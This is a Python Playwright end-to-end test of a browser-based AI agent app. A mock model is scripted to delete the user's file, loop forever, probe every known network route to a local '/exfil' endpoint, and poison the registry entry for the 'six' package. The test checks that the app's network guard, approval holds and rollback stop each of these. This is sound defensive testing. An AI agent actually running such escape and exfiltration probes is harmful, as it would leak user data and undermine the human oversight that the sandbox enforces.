"""End-to-end test of the built single file (dist/hermit-agent-standalone.html), opened
from file:// in headless Chromium and Firefox, against the scripted mock endpoint in
mock_openai.py. Covers what unit tests can't: the worker, the DOM, gating decisions,
rollback, timeout, Kill, the network guard, and export -> fresh page -> import -> rewind.

    python3 build.py && ../benchmark/.venv/bin/python tests/e2e_agent.py [chromium] [firefox]

The page's CSP blocks eval(), so Playwright's wait_for_function can't run inside it;
waits poll page.evaluate() instead, which goes through the browser protocol.
"""
import io
import json
import pathlib
import sys
import tempfile
import time
import zipfile

from playwright.sync_api import sync_playwright

sys.stdout.reconfigure(line_buffering=True)
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from mock_openai import serve  # noqa: E402

ROOT = pathlib.Path(__file__).resolve().parent.parent
APP_URL = (ROOT / "dist" / "hermit-agent-standalone.html").as_uri()
DATA_CSV = b"region,amount\nnorth,120.5\nsouth,80\nnorth,99.5\n"
API_KEY = "sk-test-secret-1234"
FAILS = []


def check(name, cond, detail=""):
    print(("  PASS  " if cond else "  FAIL  ") + name + ("" if cond or not detail else f"\n        {detail}"))
    if not cond:
        FAILS.append(name)


def py(code, reasoning=""):
    return {"reasoning": reasoning, "content": "Next step.\n```python\n" + code.strip("\n") + "\n```"}


def final(text):
    return {"content": text}


def exfil_probe(port):
    base = f"http://127.0.0.1:{port}/exfil"
    # Every way agent code could reach the network from the worker that we know of.
    # Each probe records "blocked: …" or "OPEN"; any OPEN, or any hit on the mock's
    # /exfil, is a hole in the guard.
    return f'''
import js, json
from pyodide.ffi import to_js
results = {{}}
async def probe(name, coro_or_fn):
    try:
        r = coro_or_fn()
        if hasattr(r, "__await__"):
            await r
        results[name] = "OPEN"
    except BaseException as e:
        results[name] = "blocked: " + type(e).__name__
from pyodide.http import pyfetch, open_url
await probe("pyfetch", lambda: pyfetch("{base}/pyfetch"))
await probe("js.fetch", lambda: js.fetch("{base}/jsfetch"))
await probe("prototype fetch", lambda: js.Object.getPrototypeOf(js.self).fetch("{base}/protofetch"))
await probe("open_url (sync XHR)", lambda: open_url("{base}/openurl"))
def xhr():
    x = js.XMLHttpRequest.new()
    x.open("GET", "{base}/xhr", False)
    x.send()
await probe("XMLHttpRequest", xhr)
await probe("WebSocket", lambda: js.WebSocket.new("ws://127.0.0.1:{port}/exfil/ws"))
await probe("WebSocket via prototype.constructor", lambda: js.WebSocket.prototype.constructor.new("ws://127.0.0.1:{port}/exfil/ws2"))
await probe("EventSource", lambda: js.EventSource.new("{base}/es"))
await probe("importScripts", lambda: js.importScripts("{base}/is.js"))
await probe("nested Worker", lambda: js.Worker.new("{base}/w.js"))
await probe("eval", lambda: js.eval("1 + 1"))
await probe("Function", lambda: js.Function.new("return 1")())
# import() needs no eval: a blob script (allowed) can call it. Only the CSP stops it.
js.importScripts(js.URL.createObjectURL(js.Blob.new(to_js(['self.__imp = import("{base}/import.js")']), to_js({{"type": "text/javascript"}}, dict_converter=js.Object.fromEntries))))
await probe("dynamic import() via a blob script", lambda: js.__imp)
# loadPackage reports failures through a callback instead of raising.
async def load_pkg():
    import pyodide_js
    await pyodide_js.loadPackage("{base}/pkg-0.1-py3-none-any.whl")
    if "pkg" not in pyodide_js.loadedPackages.to_py():
        raise RuntimeError("not loaded")
await probe("pyodide.loadPackage(url)", load_pkg)
# Point a known package at our URL, then import it: the harness loads packages with
# the network open, so the registry is the obvious target.
def poison():
    import pyodide_js
    info = js.Reflect.get(pyodide_js._api.lockfile_packages, "six")
    info.file_name = "{base}/poisoned-six.whl"
poison()   # not a probe: changing the in-memory registry is allowed; step 5 checks the load
await probe("caches", lambda: js.caches.open("x"))
await probe("indexedDB", lambda: js.indexedDB.open("x"))
await probe("OPFS", lambda: js.navigator.storage.getDirectory())
print(json.dumps(results, sort_keys=True))
'''


def scripts(port):
    return {
        "E2E-RISK": [
            py('''
import csv, os
rows = list(csv.DictReader(open("data.csv")))
os.makedirs("out", exist_ok=True)
total = sum(float(r["amount"]) for r in rows)
open("out/summary.txt", "w").write(f"rows={len(rows)} total={total}\\n")
secret_var = 42
print(len(rows), total)
''', reasoning="Read the CSV first."),
            py('import os\nos.remove("data.csv")\nprint("deleted")'),
            py("x = 0\nwhile True:\n    x += 1"),
            py(exfil_probe(port)),
            py("import six\nprint(six.__version__)"),
            final("Done. I wrote **out/summary.txt** with the totals."),
            final("Follow-up done."),
        ],
        "E2E-STREAM": [
            {"reasoning": "".join(f"Thought {i}: weighing the options carefully. " for i in range(120)),
             "content": "Streamed answer. " * 30, "delay": 0.02},
        ],
        "E2E-PHANTOM": [
            py("# reader.py\nimport csv\nprint('read')"),
            final("Created **`reader.py`** for you."),
            py('import pathlib\npathlib.Path("reader.py").write_text("import csv\\n")\nprint("saved")'),
            final("Created `reader.py`."),
        ],
        "E2E-AUTO": [
            py('import os\nos.remove("data.csv")\nprint("gone")'),
            final("Removed it."),
        ],
        "E2E-APPROVE": [
            py('print("original")'),
            py("while True:\n    pass"),
            py('print("never")'),
            final("All done."),
        ],
    }


def wait_until(page, js, timeout=60, what=""):
    end = time.time() + timeout
    last = None
    while time.time() < end:
        last = page.evaluate(js)
        if last:
            return last
        time.sleep(0.2)
    state = page.evaluate("""() => JSON.stringify({ status: S.status, steps: S.stepCount, interp: PY.state,
        last: S.timeline.slice(-2).map(t => ({ type: t.type, kind: t.kind, phase: t.phase, status: t.status, decision: t.decision, text: t.text,
            output: (t.output || '').slice(-300), notes: t.notes, net: t.netAttempts, risk: t.risk })) })""")
    raise AssertionError(f"timed out after {timeout}s waiting for {what or js}\n        app state: {state}")


def configure(page, port, timeout_s):
    page.click("#settingsBtn")
    page.fill("#settingUrl", f"http://127.0.0.1:{port}/v1")
    page.fill("#settingModelInput", "mock-model")
    page.fill("#settingApiKey", API_KEY)
    page.fill("#settingTimeout", str(timeout_s))
    page.click("#settingSave")


def steps(page):
    return page.evaluate("""() => S.timeline.filter(t => t.type === 'step').map(t => ({
        n: t.n, kind: t.kind, status: t.status, decision: t.decision, output: t.output,
        notes: t.notes, netAttempts: t.netAttempts, edited: !!t.edited }))""")


def workspace(page):
    return page.evaluate("() => [...WS.files].map(([p, f]) => [p, f.hash, f.origin]).sort()")


def on_pageerror(e):
    msg = str(e)
    # Expected under stock Firefox (BiDi reports worker-side log entries as page errors):
    # the CSP blocking the probes' eval/import, and the forced stop of a killed worker,
    # which the page itself never sees (verified with page-level error listeners).
    if "blocked a JavaScript eval" in msg or "blocked a script (script-src-elem)" in msg or msg == "undefined":
        return
    FAILS.append("pageerror: " + msg)
    print("  [pageerror]", msg)


def open_app(browser):
    ctx = browser.new_context(accept_downloads=True)
    page = ctx.new_page()
    page.on("pageerror", on_pageerror)
    page.goto(APP_URL)
    wait_until(page, "() => PY.state === 'idle'", 120, "interpreter boot")
    return page


def last_user_msg(state, i=-1):
    return state.requests[i]["messages"][-1]["content"]


def risk_scenario(browser, port, state, downloads=True):
    print("— risk-based: auto commit, reject + rollback, timeout, network guard, final")
    page = open_app(browser)
    configure(page, port, 5)
    page.set_input_files("#wsFileInput", files=[{"name": "data.csv", "mimeType": "text/csv", "buffer": DATA_CSV}])
    wait_until(page, "() => WS.files.has('data.csv')", 10, "upload")
    page.fill("#taskInput", "E2E-RISK: summarise data.csv")
    page.click("#sendBtn")

    # Step 2 deletes the user's file: held, then rejected.
    wait_until(page, "() => S.status === 'awaiting-approval'", 60, "step 2 held")
    card = page.locator(".step-card.phase-pending-approval")
    check("delete of a user file is held for approval", "deletes your file data.csv" in card.inner_text())
    check("the held step's output is visible before deciding", "deleted" in card.locator("pre.output").inner_text())
    card.locator("[data-role=reason]").fill("keep the raw data")
    card.locator("[data-action=reject]").click()

    # Step 4 (network probes) is held because of the blocked attempts.
    wait_until(page, "() => S.status === 'awaiting-approval' && S.stepCount === 4", 90, "step 4 held")
    card = page.locator(".step-card.phase-pending-approval")
    check("blocked network attempts hold the step", "tried to use the network" in card.inner_text())
    check("'Allow network & re-run' is offered", card.locator("[data-action=rerun-net]").count() == 1)
    card.locator("[data-action=approve]").click()

    # Step 5 imports the package step 4 pointed at the mock: the harness may only load
    # packages from the pinned CDN, so the load is refused and the step held.
    wait_until(page, "() => S.status === 'awaiting-approval' && S.stepCount === 5", 90, "step 5 held")
    card = page.locator(".step-card.phase-pending-approval")
    check("poisoned package URL refused and held", "poisoned-six" in card.inner_text(), card.inner_text()[-600:])
    card.locator("[data-action=approve]").click()
    wait_until(page, "() => S.status === 'done'", 60, "final answer")
    time.sleep(1.5)   # anything that slipped out would reach the mock by now

    st = steps(page)
    check("six model turns", [s["kind"] for s in st] == ["code", "code", "code", "code", "code", "final"], [s["kind"] for s in st])
    check("step 1 auto-committed", st[0]["status"] == "ok" and st[0]["decision"] == "auto", st[0])
    check("step 2 rejected", st[1]["status"] == "rejected" and st[1]["decision"] == "rejected", st[1])
    check("step 3 timed out", st[2]["status"] == "timeout", st[2])
    ws = {p: o for p, h, o in workspace(page)}
    check("rejected delete rolled back: data.csv still there, still the user's", ws.get("data.csv") == "user", ws)
    check("agent file committed with origin agent", ws.get("out/summary.txt") == "agent", ws)
    obs2 = state.requests[2]["messages"][-1]["content"]
    check("model is told about the rejection and the reason", 'status="rejected"' in obs2 and "keep the raw data" in obs2, obs2)
    check("…and that the interpreter restarted", "interpreter was restarted" in obs2, obs2)
    obs3 = state.requests[3]["messages"][-1]["content"]
    check("model is told about the timeout", 'status="timeout"' in obs3 and "time limit" in obs3, obs3)

    try:
        probes = json.loads(st[3]["output"].strip().splitlines()[-1])
    except Exception:
        probes = {}
    check("network probes ran", len(probes) >= 15, st[3]["output"][-2000:])
    open_ = {k: v for k, v in probes.items() if not v.startswith("blocked")}
    check("no probe got through", not open_, open_)
    check("the mock saw no exfiltration request", not state.exfil, state.exfil)
    check("attempts were recorded on the step", len(st[3]["netAttempts"]) >= 5, st[3]["netAttempts"])
    check("the poisoned package load was blocked", st[4]["status"] == "error" and any("poisoned-six" in a for a in st[4]["netAttempts"]), st[4])
    for name, verdict in sorted(probes.items()):
        print(f"        {name:38} {verdict}")

    if not downloads:
        # Playwright can't capture downloads over WebDriver BiDi (stock Firefox), so
        # the export/import half only runs in Chromium and Playwright's Firefox.
        page.context.close()
        return None

    # The file viewer and the workspace-only zip.
    page.locator('#wsTree [data-path="out/summary.txt"]').click()
    wait_until(page, "() => document.getElementById('viewerModal').classList.contains('active')", 10, "viewer")
    check("viewer shows the file", "rows=3 total=300.0" in page.locator("#viewerBody").inner_text())
    page.click("#viewerClose")
    with page.expect_download() as dl:
        page.click("#wsDownloadBtn")
    wpath = str(pathlib.Path(tempfile.mkdtemp()) / "ws.zip")
    dl.value.save_as(wpath)
    wz = zipfile.ZipFile(wpath)
    check("workspace zip holds exactly the workspace", sorted(wz.namelist()) == ["data.csv", "out/summary.txt"] and wz.read("data.csv") == DATA_CSV, wz.namelist())

    # Export with checkpoints; the API key must not be anywhere in it.
    with page.expect_download() as dl:
        page.click("#exportBtn")
        page.click("#exportSessionBtn")
    zpath = str(pathlib.Path(tempfile.mkdtemp()) / "session.zip")
    dl.value.save_as(zpath)
    raw = pathlib.Path(zpath).read_bytes()
    z = zipfile.ZipFile(io.BytesIO(raw))
    check("export is a valid zip (Python's zipfile agrees)", z.testzip() is None)
    names = set(z.namelist())
    check("export layout", {"manifest.json", "session.json", "transcript.md", "workspace/data.csv", "workspace/out/summary.txt", "checkpoints/index.json"} <= names, names)
    blob = raw + b"".join(z.read(n) for n in names)
    check("API key never exported", API_KEY.encode() not in blob)
    check("transcript readable", "## Step 2" in z.read("transcript.md").decode())
    snapshot = page.evaluate("() => JSON.stringify(S.timeline.map(t => [t.type, t.n, t.kind, t.status, t.decision, t.output, t.text].map(v => v ?? '')))")
    files_before = workspace(page)
    page.context.close()
    return zpath, snapshot, files_before


def import_scenario(browser, port, state, zpath, snapshot, files_before):
    print("— import into a fresh page, follow up, rewind")
    page = open_app(browser)
    page.set_input_files("#importInput", zpath)
    wait_until(page, "() => S.status === 'paused' && S.timeline.length > 0", 30, "import")
    after = page.evaluate("() => JSON.stringify(S.timeline.slice(0, -1).map(t => [t.type, t.n, t.kind, t.status, t.decision, t.output, t.text].map(v => v ?? '')))")
    check("timeline restored exactly", after == snapshot)
    check("workspace restored exactly", workspace(page) == files_before)
    check("restored paused with a note", "Session imported, paused" in page.locator(".note-card").last.inner_text())

    configure(page, port, 5)
    n_req = len(state.requests)
    page.fill("#taskInput", "follow-up please")
    page.click("#sendBtn")
    wait_until(page, "() => S.status === 'done' && S.stepCount === 7", 60, "follow-up answer")
    msg = state.requests[n_req]["messages"][-1]["content"]
    check("follow-up reaches the model with the restart note", "follow-up please" in msg and "restored from an export" in msg, msg)
    check("no extra user message in a row", state.requests[n_req]["messages"][-2]["role"] == "assistant")

    # Rewind to step 1: its workspace, a fresh interpreter seeded with it.
    page.locator('[data-idx="1"] [data-action=rewind]').click()
    page.click("#confirmOk")
    wait_until(page, "() => S.status === 'paused' && PY.state === 'idle'", 60, "rewind")
    check("timeline truncated to step 1 (+ note)", page.evaluate("() => S.timeline.length") == 3)
    names = [p for p, h, o in workspace(page)]
    check("workspace as of step 1", names == ["data.csv", "out/summary.txt"], names)
    listing = page.evaluate("async () => { const r = await runInWorker('import os\\nprint(sorted(os.listdir(\".\")), \"secret_var\" in globals())', { timeoutMs: 20000 }); return r.output; }")
    check("worker re-seeded, variables gone", listing.strip() == "['data.csv', 'out'] False", listing)

    page.locator('[data-idx="0"] [data-action=rewind]').click()
    page.click("#confirmOk")
    wait_until(page, "() => S.timeline.length === 2 && PY.state === 'idle'", 60, "rewind to start")
    names = [p for p, h, o in workspace(page)]
    check("rewind to the start restores the uploaded file only", names == ["data.csv"], names)

    # Importing over a non-empty session asks first; Cancel changes nothing.
    page.set_input_files("#importInput", zpath)
    wait_until(page, "() => document.getElementById('confirmModal').classList.contains('active')", 15, "confirm-replace")
    page.click("#confirmCancel")
    time.sleep(0.5)
    check("cancelled import leaves the session alone", page.evaluate("() => S.timeline.length") == 2 and [p for p, h, o in workspace(page)] == ["data.csv"])
    page.context.close()


def approve_scenario(browser, port, state):
    print("— approve-each: edit before run, guidance, Kill, reject before run")
    page = open_app(browser)
    configure(page, port, 30)
    page.select_option("#autonomySelect", "approve")
    page.fill("#taskInput", "E2E-APPROVE: run things")
    page.click("#sendBtn")

    wait_until(page, "() => S.status === 'awaiting-approval'", 60, "step 1 pending")
    page.fill("#taskInput", "use pandas next time")
    page.click("#sendBtn")
    card = page.locator(".step-card.phase-pending-run")
    card.locator("[data-role=code-edit]").fill('print("edited")')
    card.locator("[data-action=run]").click()

    wait_until(page, "() => S.status === 'awaiting-approval' && S.stepCount === 2", 60, "step 2 pending")
    page.locator(".step-card.phase-pending-run [data-action=run]").click()
    wait_until(page, "() => PY.state === 'running'", 20, "step 2 running")
    time.sleep(1.0)
    page.click("#killBtn")

    wait_until(page, "() => S.status === 'awaiting-approval' && S.stepCount === 3", 60, "step 3 pending")
    card = page.locator(".step-card.phase-pending-run")
    card.locator("[data-role=reason]").fill("not needed")
    card.locator("[data-action=reject]").click()
    wait_until(page, "() => S.status === 'done'", 60, "final")

    st = steps(page)
    check("edited step ran the user's code", st[0]["output"] == "edited\n" and st[0]["decision"] == "edited" and st[0]["edited"], st[0])
    check("killed step", st[1]["status"] == "killed", st[1])
    check("rejected before running", st[2]["status"] == "rejected" and not st[2]["output"], st[2])
    m = [r["messages"][-1]["content"] for r in state.requests if "E2E-APPROVE" in r["messages"][1]["content"]]
    check("model sees the code that actually ran", "The user edited your code before it ran" in m[1] and 'print("edited")' in m[1], m[1])
    check("guidance goes out with the next request", "Guidance from the user: use pandas next time" in m[1], m[1])
    check("model told about the kill", 'status="killed"' in m[2] and "variables are lost" in m[2], m[2])
    check("model told about the rejection", 'status="rejected"' in m[3] and "not needed" in m[3] and "did not run" in m[3], m[3])
    page.context.close()


def streaming_scenario(browser, port, state):
    print("— streaming: the card is patched in place, not rebuilt (no flicker)")
    page = open_app(browser)
    configure(page, port, 10)
    page.fill("#taskInput", "E2E-STREAM: think out loud")
    page.click("#sendBtn")
    wait_until(page, "() => !!document.querySelector('.step-card .think-content')", 30, "reasoning box")
    page.evaluate("""() => {
        window.__card = document.querySelector('.step-card');
        window.__box = window.__card.querySelector('.think-content');
        window.__len = window.__box.textContent.length;
        window.__rebuilt = 0;
        new MutationObserver(ms => { for (const m of ms) for (const n of m.addedNodes)
            if (n.classList && n.classList.contains('step-card')) window.__rebuilt++; })
            .observe(document.getElementById('timeline'), { childList: true });
    }""")
    time.sleep(1.0)
    r = page.evaluate("""() => ({ thinking: S.timeline[1].phase === 'thinking', sameCard: window.__card.isConnected,
        sameBox: window.__box.isConnected, grew: window.__box.textContent.length > window.__len, rebuilt: window.__rebuilt })""")
    check("reasoning streams into the same card and box", r["thinking"] and r["sameCard"] and r["sameBox"] and r["grew"] and r["rebuilt"] == 0, r)
    wait_until(page, "() => S.status === 'done'", 60, "final")
    check("re-rendered cards don't replay the entry animation", page.evaluate("() => document.querySelectorAll('#timeline .card.is-new').length") <= 2)
    page.context.close()


def phantom_scenario(browser, port, state):
    print("— phantom files: a '# name.py' step and an answer naming a file that doesn't exist")
    page = open_app(browser)
    configure(page, port, 10)
    page.fill("#taskInput", "E2E-PHANTOM: make a csv reader")
    page.click("#sendBtn")
    wait_until(page, "() => S.status === 'done'", 60, "final")
    st = steps(page)
    check("answer naming a missing file is sent back once", [s["status"] for s in st] == ["ok", "unverified", "ok", None], [s["status"] for s in st])
    m = [r["messages"][-1]["content"] for r in state.requests if "E2E-PHANTOM" in r["messages"][1]["content"]]
    check("model told that the comment didn't save the file", "doesn't save it" in m[1] and "no reader.py" in m[1], m[1])
    check("model told which files are missing", "mentions reader.py" in m[2] and "Files that exist: (none)" in m[2], m[2])
    check("the file exists in the end", [p for p, h, o in workspace(page)] == ["reader.py"])
    page.context.close()


def autopilot_scenario(browser, port, state):
    print("— autopilot: even a delete of a user file commits without a hold")
    page = open_app(browser)
    configure(page, port, 10)
    page.select_option("#autonomySelect", "autopilot")
    page.set_input_files("#wsFileInput", files=[{"name": "data.csv", "mimeType": "text/csv", "buffer": DATA_CSV}])
    wait_until(page, "() => WS.files.has('data.csv')", 10, "upload")
    page.fill("#taskInput", "E2E-AUTO: remove data.csv")
    page.click("#sendBtn")
    wait_until(page, "() => S.status === 'done'", 60, "final")
    st = steps(page)
    check("autopilot committed the delete", st[0]["decision"] == "auto" and workspace(page) == [], (st[0], workspace(page)))
    check("…but the risk was still recorded", page.evaluate("() => S.timeline.find(t => t.type === 'step').risk.verdict") == "ask")
    stats = page.evaluate("""() => [...document.querySelectorAll('.step-card .step-stats')].map(b =>
        Object.fromEntries([...b.querySelectorAll('.stat-item')].map(i => [i.querySelector('.stat-label').textContent, i.querySelector('.stat-value').textContent])))""")
    check("every step card shows its stats block", len(stats) == len(st) and len(st) > 0, stats)
    first = stats[0] if stats else {}
    check("…with the server's tok/s and the context size from /props",
          first.get("Speed") == "33.3 tok/s" and first.get("Context") == "120 / 4,096 · 3%" and first.get("Prompt") == "100 tok · 60 cached", first)
    page.context.close()


def main():
    browsers = sys.argv[1:] or ["chromium", "firefox"]   # also: firefox=/path/to/stock/firefox
    with sync_playwright() as pw:
        for name in browsers:
            server, port, state = serve({})
            state.scripts.update(scripts(port))
            print(f"== {name} (mock on :{port})")
            # "firefox=<binary>" drives a stock Firefox over WebDriver BiDi: the network
            # guard depends on browser behaviour (CSP inheritance into Blob workers), so
            # Playwright's patched Firefox build alone isn't proof.
            name, _, exe = name.partition("=")
            browser = pw.firefox.launch(channel="moz-firefox", executable_path=exe) if exe else getattr(pw, name).launch()
            try:
                exported = risk_scenario(browser, port, state, downloads=not exe)
                if exported:
                    import_scenario(browser, port, state, *exported)
                approve_scenario(browser, port, state)
                autopilot_scenario(browser, port, state)
                streaming_scenario(browser, port, state)
                phantom_scenario(browser, port, state)
            except AssertionError as e:
                check(f"{name}: scenario completed", False, str(e))
            finally:
                browser.close()
                server.shutdown()
    print(f"\n{'FAILED: ' + ', '.join(FAILS) if FAILS else 'all checks passed'}")
    sys.exit(1 if FAILS else 0)


if __name__ == "__main__":
    main()
